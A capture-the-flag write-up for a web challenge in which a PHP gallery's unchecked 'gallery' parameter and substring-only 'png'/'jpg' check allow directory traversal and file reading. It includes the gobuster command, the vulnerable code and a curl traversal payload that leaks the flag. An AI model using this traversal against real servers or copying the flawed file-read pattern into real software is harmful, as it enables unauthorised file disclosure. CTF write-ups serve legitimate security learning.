# web/Expecto Patronum

### Description
> Джош вже довгий час вважав свого пса Патрона найкращим другом та надійним захисником у будь-якій ситуації. Патрон розумна собака, віддана та надзвичайно чуйна. Джош завжди говорив, що його пес - це його справжній скарб, тому він вирішив створити галерею з фотографій Патрона.

On main page there is Patron and only him

![expecto_patronum1](/2023/UA30/web/images/expecto_patronum1.png)

But fortunately or not we are looking for flag, so lets use gobuster

`gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt -u https://expecto-patronum.ua30ctf.org/`

It found **/gallery** and **/src** with zip archive which contains website's source code 

But archive locked with password, after some guessing I found correct one - `patron`

In **index.php** there is interesting block of code

```php
if ( empty($query)) {
    if(isset($_GET['gallery'])){
        $scandir = $_GET['gallery']."/";
        $files = scandir($scandir);
        $image_list = array_diff($files, array('.', '..'));
    }
    foreach ($image_list as $key => $value) {
        if(isset($_POST['list-icon'])){ ?>  
       
        <div class="image small">
                <img src="gallery/<?php echo $image_list[$key] ; ?>" />
                <?php echo $image_list[$key] ; ?>
            </div>
<?php   }elseif($_POST['full-size']) {   
             $url=$scandir.$image_list[$key];
             if((strpos($url, "png") !== false)or((strpos($url, "jpg") !== false))){
             $data = file_get_contents($url);   
             $base64 = 'data:image/png;base64,' . base64_encode($data);
             ?>  
                <img src="<?php 
                    echo $base64; 
                ?>"/> 
                <?php }}else{ ?>
             
            <div class="image display-inline-block">
                <img src="gallery/<?php 
                echo $image_list[$key] ; 
                ?>" />
            </div>
<?php   
        }    
    }
    
}
```

On POST request with **full-size** parameter on url which contains **png** or **jpg** (not .png or .jpg) it sends base64 encoded contents of file on that url

And it also gives us directory traversal

After some searching on the system I found flag in **/home** and **libpng16-16** in /usr/share/home so I crafted this request

`curl -X POST 'https://expecto-patronum.ua30ctf.org/?gallery=/usr/share/doc/libpng16-16/../../../../../../home' -d 'full-size=True'`

Which gave `<img src="data:image/png;base64,Y3Rme0phY2tfUnVzc2VsbF9UZXJyaWVyfQo="/>`

*ctf{Jack_Russell_Terrier}*
